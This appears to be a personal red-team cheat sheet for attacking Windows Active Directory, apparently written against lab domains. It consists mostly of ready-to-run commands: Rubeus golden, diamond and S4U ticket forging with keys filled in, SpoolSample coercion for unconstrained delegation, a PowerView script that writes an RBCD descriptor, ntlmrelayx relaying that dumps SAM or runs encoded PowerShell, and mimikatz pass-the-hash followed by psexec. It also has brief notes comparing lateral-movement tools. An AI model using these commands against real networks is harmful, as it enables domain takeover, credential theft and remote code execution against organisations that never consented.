
**Pass The Hash**: it's means injecting the hash into LSASS.exe or use it to in NTLM challange. becuase NTLM only use the hash in auth. 


# Another Creds

## Golden & Diamond
```ruby
# DAMOND
Rubeus.exe diamond /tgtdeleg /domain:evil.corp /dc:DC20.evil.corp /ticketuser:Administrator /ticketuserid:500 /groups:512 /krbkey:40e577a38c16cdd96047a7ae19c61b69e180051e12785527cda7a214e238e6b8 /ptt /nowrap

# GOLDEN
Rubeus.exe golden /aes256:40e577a38c16cdd96047a7ae19c61b69e180051e12785527cda7a214e238e6b8 /domain:evil.corp /sid:S-1-5-21-3013900923-796858115-4076014446 /user:Administrator /ptt
```

## [[skove/notes/windows arch/active directory/Kerbros#Kerberoasting|Kerberoasting]]
## [[skove/notes/windows arch/active directory/Kerbros#AS-REP Roasting|AS-REP Roasting]]

## Cashed Tickets
you first want to know which computer has Unconstrained Delegation enabled:
```bash 
ldapsearch -x -H ldap://192.168.1.100 -D "hacker@forest.lab" -w "palestine" -b "DC=forest,DC=lab" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" distinguishedName 
```

now keep listining:
```php
rubeus monitor /targetuser:menna /interval:1 /nowrap
```

with only dir \\win10.forest.lab\tmp can catch the TGT  

if now one made that smb request you can try to use this one:
```php
SpoolSample.exe dc19.forest.lab win10.forest.lab
```
this should ask the dc19 to auth with the win10 !! 


also maybe there is a constrained Delegation:
```bash
ldapsearch -LLL -x -H ldap://192.168.1.100 -D "hacker@forest.lab" -w "palestine" -b "DC=forest,DC=lab" "(&(objectCategory=computer)(msds-allowedtodelegateto=*))"
```

>you do not have to stick with the msDS-AllowedToDelegateTo name. for example if eventlog only enabled you can use the flag `/altservice:cifs` with the rubeus command blow: 🔻

if there is you can try to make a S4U:
```php
Rubeus.exe s4u /impersonateuser:hana /msdsspn:cifs/dc19.forest.lab /user:win10$ /ticket:<win10$-TGT-base64> /nowrap /opsec
```

>you can got the <win10$-TGT-base64> usign Rubeus [triage, dump, asktgt]


## resource-based constrained delegation (RBCD)

you access a service on a computer with any user if you have this permition to change the property  `msds-allowedtoactonbehalfofotheridentity` 
check that with `PowerView`: 
```bash
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDS | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-2027079033-1722292501-3090208703-[\d]{4,10}" } 
```

> this regex S-1-5-21-2027079033-1722292501-3090208703-[\d]{4,10}  to list the domain users only, just change the first part with the domain SID 

> you can find it with `Get-DomainUser  -Identity "menna" | fl objectsid `

now you need the computer account if you do not have one just create a new computer with `standin` 

now do it with 
```bash 
$target = "WIN10";
$attacksid = "S-1-5-21-2027079033-1722292501-3090208703-1105";

$rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$attacksid)";
$rsdb = New-Object byte[] ($rsd.BinaryLength);
$rsd.GetBinaryForm($rsdb,0);
Get-DomainComputer -Identity $target | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$rsdb}
```

the $sid is the sid of the computer you will use or the computer you created  




## NTLM relaying 
1. forward the service {smb} packets to ntlmrelayx host using netsh or `SteamDivert` if you don't want to stop SMB or whatever the service. 
```bash 
# dump the SAM 
sudo ntlmrelayx.py -t smb://192.168.1.100 -smb2support --no-multirelay -debug

# RCE 
sudo /home/anas/.local/bin/ntlmrelayx.py -t smb://192.168.1.101 -smb2support -debug -c "powershell.exe -EncodedCommand <RCE-Base64>"
```


# DACL
first check who can edit this user
```bash
# for one user 
Get-DomainObjectAcl -Identity jadams | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select SecurityIdentifier, ActiveDirectoryRights | fl

# for all the users 
 Get-DomainObjectAcl -SearchBase "CN=Users,DC=dev,DC=cyberbotic,DC=io" | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
 
 # this will seach only for the users because the last regex. if you want to search for all use the script below or just remove the last condition ;)  
```

or use ___my script___: 
```bash
Get-DomainObjectAcl -Server 192.168.1.100 -Identity hana |
    ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" } |
    % { 
        $sid = $_.SecurityIdentifier
        $name = try { (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate([System.Security.Principal.NTAccount]) } catch { $sid }
        [PSCustomObject]@{
            ObjectDN = $_.ObjectDN
            Rights   = $_.ActiveDirectoryRights
            Identity = $name
        }
    }

```


# Log in to remote 
- inject a fake token into lsass.exe:
```php
PS> .\mimikatz.exe "sekurlsa::pth /user:Alice /domain:domain.com
/ntlm:a0c8746a6efc7782c7c19c55185145be"
```
- then use: 
```cmd
psexec.exe \\192.168.1.100 cmd.exe
```



- **PsExec (Sysinternals):**
    1. Authenticate via SMB (user/pass or hash).
    2. Upload `PSEXESVC.exe`.
    3. Create a **remote Windows service** using `CreateService` API.
    4. Start service → runs your target process (`cmd.exe` or other).
	- **Notes:** Requires admin + “logon as service”; blocked on DCs for normal admins.
- **wmiexec.py (Impacket):**
    1. Authenticate via username/password or NTLM hash.
    2. Call WMI class `Win32_Process.Create()` to spawn a command.
    3. Capture stdout/stderr via WMI and return to client.
	- **Notes:** Works even if service creation is blocked; good for DCs or restricted users.
- **smbexec.py (Impacket):**
    1. Authenticate via SMB.
    2. Upload payload.
    3. Execute payload using remote service or `at` scheduler trick.
    4. Stream output back via SMB.
    5. Cleanup temporary executable.
	- **Notes:** Bypasses PsExec UAC/service restrictions; good for DCs where normal PsExec fails.
- **psexec.py (Impacket):**
    1. Authenticate via username/password or NTLM hash.
    2. Upload `psexecsvc.exe` to the target machine.
    3. Use **Service Control Manager (SCM)** to create and start the service that runs your command.
    4. Capture stdout/stderr over SMB back to your machine.
    5. Stop service and remove temporary executable.
	- **Notes:** Functionally similar to Sysinternals PsExec but implemented in Python/Impacket; can work with hashes and scripting automation; still requires admin/service rights for remote service creation.

# LAPS
[[skove/notes/windows arch/active directory/LAPS]]